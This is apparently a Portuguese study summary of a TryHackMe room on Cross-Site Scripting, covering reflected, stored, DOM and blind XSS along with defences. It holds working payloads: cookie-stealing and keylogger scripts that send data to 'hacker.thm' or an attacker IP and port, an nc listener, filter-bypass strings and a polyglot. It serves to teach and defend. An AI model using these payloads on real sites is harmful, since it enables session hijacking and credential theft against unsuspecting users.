# 🛡️ Resumão XSS Introduction — Anotações TryHackMe

> Sala do módulo **Web Application Vulnerabilities I**. Cobre Cross-Site Scripting de ponta a ponta: terminologia, payloads, os tipos (Reflected, Stored, DOM, Blind), exploração por contexto e mitigação.
>
> ⚠️ **Use apenas em laboratórios (TryHackMe, HackTheBox, PortSwigger Academy, VMs próprias) ou em sistemas para os quais você tenha autorização por escrito.**

---

## 📑 Índice

1. [O que é XSS](#1-o-que-é-xss)
2. [Terminologia essencial](#2-terminologia-essencial)
3. [Anatomia de um payload](#3-anatomia-de-um-payload)
4. [Os 4 tipos de XSS](#4-os-4-tipos-de-xss)
5. [Reflected XSS](#5-reflected-xss)
6. [Stored XSS](#6-stored-xss)
7. [DOM-Based XSS](#7-dom-based-xss)
8. [Blind XSS](#8-blind-xss)
9. [🎯 Payloads por contexto (os 6 níveis)](#9--payloads-por-contexto-os-6-níveis)
10. [Polyglot](#10-polyglot)
11. [Mitigação](#11-mitigação)
12. [Erros comuns](#12-erros-comuns)

---

## 1. O que é XSS

O atacante injeta **JavaScript** numa página, que roda **no navegador de outros usuários**. Abusa da **confiança do navegador no site**.

**XSS vs CSRF vs SQLi:**

| | SQLi | CSRF | XSS |
|---|---|---|---|
| Ataca | O banco | A sessão (dispara ação) | O navegador (executa código) |
| Atacante vê resposta? | Depende | Não (cego) | **Sim** (controla a página) |
| Raiz | Input vira **SQL** | Confia na origem | Input vira **HTML/JS** |

**Impacto:** roubar sessão (cookie), entregar malware, keylogger, agir pela vítima, takeover de conta.

---

## 2. Terminologia essencial

| Termo | O que é | Papel no XSS |
|---|---|---|
| **DOM** | Árvore de elementos da página que o JS lê/altera | Onde o payload age |
| **URL parameters** | O que vem depois do `?` (`?q=hello`) | Input não confiável, controlável |
| **JavaScript** | Linguagem que roda no navegador | O payload **é** JS |
| **Cookies** | Guardam session ID | Se legível por JS → roubo de sessão |
| **`HttpOnly`** | Flag que impede o JS de ler o cookie | **Defesa** — mata o roubo via `document.cookie` |
| **Escaping** | Transforma input em texto (`<` → `&lt;`) | **A cura** |

> **Escaping ≠ Filtering:** escaping (output encoding) trata a **saída** e resolve; filtering (input validation) só **checa** a entrada e é frágil.

---

## 3. Anatomia de um payload

| Parte | O que é |
|---|---|
| **Intention** | O que faz: PoC, roubar cookie, keylogger, agir pela vítima |
| **Modification** | Ajustar pra executar **naquele contexto** (fechar tag/atributo/bloco JS) |

**Payload de teste (PoC):**
```html
<script>alert('XSS')</script>
```

**Intenções:**
```html
<!-- Roubo de cookie -->
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

<!-- Keylogger -->
<script>document.onkeypress = function(e){ fetch('https://hacker.thm/log?key=' + btoa(e.key)); }</script>

<!-- Business logic -->
<script>user.changeEmail('attacker@hacker.thm');</script>
```
> `btoa()` = Base64, pra transmitir seguro. Roubo de cookie **só funciona se o cookie NÃO for HttpOnly**.

---

## 4. Os 4 tipos de XSS

| Tipo | Passa pelo servidor? | Onde vive | Atinge | Precisa clique? |
|---|---|---|---|---|
| **Reflected** | Sim (na hora) | No link | Quem clica | Sim |
| **Stored** | Sim (salvo) | No servidor | Todos que visitam | Não |
| **DOM-based** | **Não** (só cliente) | No JS do navegador | Quem abre a URL | Sim |
| **Blind** | Sim (salvo) | Painel interno (não visível) | Admin/staff | Não |

---

## 5. Reflected XSS

App pega o input e **devolve na hora** sem sanitizar. Payload vive no **link**. Precisa de engenharia social (vítima clica).

```
atacante cria link c/ payload → vítima clica → site reflete → JS roda
```

**Raiz (exemplo Flask):**
```python
q = request.args.get("q", "")          # SOURCE: dado não confiável
query_escaped = escape(q)              # versão segura (criada mas não usada!)
return render_template("news.html", query=q, ...)   # passa o CRU → SINK
```
> **Source → Sink:** dado não confiável entra (source) e é usado perigosamente (sink) sem sanitizar. No Jinja2, `{{ q }}` já escapa; a falha aparece com `{{ q|safe }}` ou autoescape desligado.

---

## 6. Stored XSS

App **salva** o input e serve pra **todos**. O mais grave: atinge admins sem engenharia social.

**Raiz:** o filtro `|safe` do Jinja **desliga** o escape automático:
```python
{{ c.comment|safe }}      # |safe diz "confie, já é seguro" — mentira
```
```python
COMMENTS.append({"name": escape(name), "comment": comment})
#                        ^ escapado        ^ CRU (inconsistência)
```
> Vulnerabilidade = **desligar ativamente** uma proteção que já existia. `|safe` é anti-padrão.

---

## 7. DOM-Based XSS

Acontece **só no cliente**. O JS lê dado do DOM e escreve de volta de forma insegura. **O servidor nem vê** o payload.

**Sources:** `location.hash`, `location.search`, `document.referrer`, `localStorage`, URL.
**Sinks:** `innerHTML`, `document.write`, `eval`.

**Payload clássico:**
```html
<img src=x onerror="alert('Hacked')">
```
> Por que `<img>` e não `<script>`? `innerHTML` **não executa** `<script>` inserido depois (regra HTML5). O `onerror` dispara quando a imagem (`src=x`, inexistente) falha ao carregar.

**Raiz:**
```javascript
element.innerHTML = userInput;    // ❌ interpreta como HTML
element.textContent = userInput;  // ✅ trata como texto
```
> Defesa server-side **não ajuda** (o que vem após `#` nem vai ao servidor). A cura tem que estar no JS do cliente (ou DOMPurify).

---

## 8. Blind XSS

Como Stored, mas você **não vê** executar, dispara num painel que você não acessa (staff/admin). **Precisa de callback** pra saber que funcionou.

**Setup do listener:**
```bash
nc -nlvp 9001          # -n sem DNS, -l listen, -v verbose, -p porta
ip addr show tun0      # pega seu IP na VPN
```

**Payload (roubo de cookie):**
```html
<script>fetch('http://SEU_IP:9001?cookie=' + btoa(document.cookie));</script>
```

**Com escape de contexto** (se cair numa textarea):
```html
</textarea><script>fetch('http://SEU_IP:9001?cookie=' + btoa(document.cookie));</script>
```

**Decodificar o cookie recebido:**
```bash
echo "VALOR_BASE64" | base64 -d
```

> A requisição que chega no Netcat traz `Connection: keep-alive` (padrão dos navegadores).
> ⚠️ **VPN costuma bloquear a volta.** Se o cookie não chegar, use o **AttackBox** ou o **Request Catcher** do THM (`http://nome.requestcatcher.com`) no lugar do IP.
> Ferramenta dedicada: **XSS Hunter Express** (captura cookie, URL, conteúdo automaticamente).

---

## 9. 🎯 Payloads por contexto (os 6 níveis)

> A habilidade central: **leia o page source**, veja em que contexto o input cai, feche-o e injete.

| Nível | Contexto | Payload |
|---|---|---|
| **1** | HTML normal | `<script>alert('THM');</script>` |
| **2** | `value="..."` de `<input>` | `"><script>alert('THM');</script>` |
| **3** | `<textarea>` | `</textarea><script>alert('THM');</script>` |
| **4** | Bloco JavaScript | `';alert('THM');//` |
| **5** | Filtro remove "script" | `<sscriptcript>alert('THM');</sscriptcript>` |
| **6** | `<img>` com `<` `>` filtrados | `/images/cat.jpg" onload="alert('THM');` |

**A lógica de cada truque:**
- **Nível 2:** `">` fecha o atributo `value` e a tag `<input>`.
- **Nível 3:** `</textarea>` fecha a tag.
- **Nível 4:** `'` fecha a string, `;` encerra o comando, `//` comenta o resto.
- **Nível 5:** o filtro remove "script" **uma vez** → `sscriptcript` deixa `script` após a remoção.
- **Nível 6:** não dá pra inserir tag (`<` `>` filtrados) → usa evento `onload` de uma tag existente.

---

## 10. Polyglot

String que escapa de **qualquer contexto** e passa por filtros ao mesmo tempo (funcionaria nos 6 níveis):

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
> Útil pra testar rápido, mas entender o contexto manualmente é o que ensina.

---

## 11. Mitigação

| Defesa | O que faz |
|---|---|
| **Output encoding (escaping)** | **A cura.** Escapar na saída, **no contexto certo** (HTML, atributo, JS, URL) |
| **`HttpOnly` no cookie** | JS não lê o cookie → mata roubo de sessão |
| **Content Security Policy (CSP)** | Restringe de onde scripts podem rodar |
| **DOMPurify** | Sanitiza HTML quando você *precisa* renderizar input do usuário |
| **`textContent` em vez de `innerHTML`** | Trata dado como texto, não HTML (contra DOM-XSS) |
| **Input validation** | Reforço (allowlist), nunca a defesa principal |

> ⚠️ **Filtro/blocklist NÃO protege** (os níveis 5 e 6 provam). A cura é **output encoding no contexto certo**, igual o prepared statement é pro SQLi.

---

## 12. Erros comuns

- ❌ Não ler o **page source** antes → payload errado pro contexto.
- ❌ Usar `<script>` dentro de `innerHTML` (não executa) → use `<img onerror>`.
- ❌ Confiar em **filtro de palavra/caractere** → tem contorno (aninhar, eventos).
- ❌ Usar `|safe` no Jinja com dado de usuário → desliga a proteção.
- ❌ Esperar que a defesa server-side pegue **DOM-XSS** (não pega).
- ❌ No Blind XSS, esperar o cookie no `nc` pela VPN → use AttackBox/Request Catcher.
- ❌ Achar que roubo de cookie sempre funciona → `HttpOnly` bloqueia.
- ❌ Testar sites sem autorização.

---

*Módulo: Web Application Vulnerabilities I — XSS Introduction. Fecha o trio SQLi + CSRF + XSS.*
